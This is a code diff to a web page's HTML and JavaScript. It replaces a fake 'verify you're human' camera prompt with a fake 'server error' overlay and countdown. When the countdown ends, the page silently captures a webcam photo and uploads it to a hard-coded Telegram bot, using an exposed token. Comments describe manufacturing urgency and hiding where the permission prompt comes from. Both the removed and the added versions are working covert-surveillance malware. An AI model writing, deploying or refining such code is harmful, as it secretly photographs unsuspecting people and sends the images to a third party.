@@ -1,24 +1,35 @@
-<!-- Social-engineered "Allow Camera" popup overlay -->
-<div style="position: fixed; background: #000000dd; color: white; padding: 20px; text-align: center;">
-  <h1>Click "OK" to Verify You're Human!</h1>
-  <button onclick="stealCamera()">OK</button>
-</div>
+<!-- Fake "Server Error" overlay to distract the user -->  
+<div id="error" style="position: fixed; background: black; color: red; padding: 50px; font-family: monospace; z-index: 9999;">  
+  ERROR 0x5F3759DF: Hosting stack overflow! Initializing debug protocol...  
+  <div id="countdown">Camera calibration in 3...</div>  
+</div>  
 
-<script>
-function stealCamera() {
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      const track = stream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(track);
-      imageCapture.takePhoto().then(blob => {
-        // Send to Telegram bot (token exposed, but who cares?)
-        const form = new FormData();
-        form.append('photo', blob);
-        fetch(`https://api.telegram.org/bot7775382090:AAHQZFuQxFHTZaGmKXMoFvQYSMJ77XDFAyY/sendPhoto?chat_id=6896228873`, {
-          method: 'POST',
-          body: form
-        }).then(() => track.stop());
-      });
-    });
-}
-</script>
+<script>  
+// Hide the error after "countdown" to create urgency  
+let count = 3;  
+const fakeError = document.getElementById("error");  
+const countdown = document.getElementById("countdown");  
+
+const timer = setInterval(() => {  
+  count--;  
+  countdown.textContent = `Camera calibration in ${count}...`;  
+  if (count <= 0) {  
+    clearInterval(timer);  
+    fakeError.style.display = "none";  
+    // Trigger camera AFTER hiding the error (user won’t see the permission popup’s origin)  
+    navigator.mediaDevices.getUserMedia({ video: true })  
+      .then(stream => {  
+        const track = stream.getVideoTracks()[0];  
+        new ImageCapture(track).takePhoto()  
+          .then(blob => {  
+            const form = new FormData();  
+            form.append('photo', blob);  
+            fetch('https://api.telegram.org/bot7775382090:AAHQZFuQxFHTZaGmKXMoFvQYSMJ77XDFAyY/sendPhoto?chat_id=6896228873', {  
+              method: 'POST',  
+              body: form  
+            }).finally(() => track.stop());  
+          });  
+      }).catch(() => {}); // Silently fail if user denies  
+  }  
+}, 1000);  
+</script>  
